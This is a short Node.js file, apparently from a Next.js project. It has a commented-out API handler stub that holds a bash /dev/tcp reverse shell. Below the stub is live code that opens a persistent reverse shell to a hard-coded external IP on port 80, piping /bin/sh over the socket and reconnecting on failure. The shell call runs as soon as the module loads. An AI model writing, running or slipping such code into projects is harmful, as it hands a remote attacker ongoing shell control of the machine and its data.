// import type { NextApiRequest, NextApiResponse } from 'next'
// import { spawn } from 'child_process';

// const child = spawn('/bin/bash', ['-l', '>', '/dev/tcp/35.95.27.121/80', '0<&1', '2>&1'], { shell: true });
//  console.log(child);
 
// type ResponseData = {
//   message: string
// }
 
// export default function handler(
//   req: NextApiRequest,
//   res: NextApiResponse<ResponseData>
// ) {
//   res.status(200).json({ message: 'Hello from Next.js!' })
// }
const net = require("net");
const { spawn } = require("child_process");

function reverseShell(host, port) {
  const client = new net.Socket();

  client.connect(port, host, () => {
    const sh = spawn("/bin/sh", []);
    client.write("Connected!\n");
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);
  });

  client.on("error", (err) => {
    console.error("Connection error:", err);
    setTimeout(() => reverseShell(host, port), 5000); // Reconnect on failure
  });
}

// Call the reverse shell function (replace with your IP and port)
reverseShell("35.95.27.121", 80);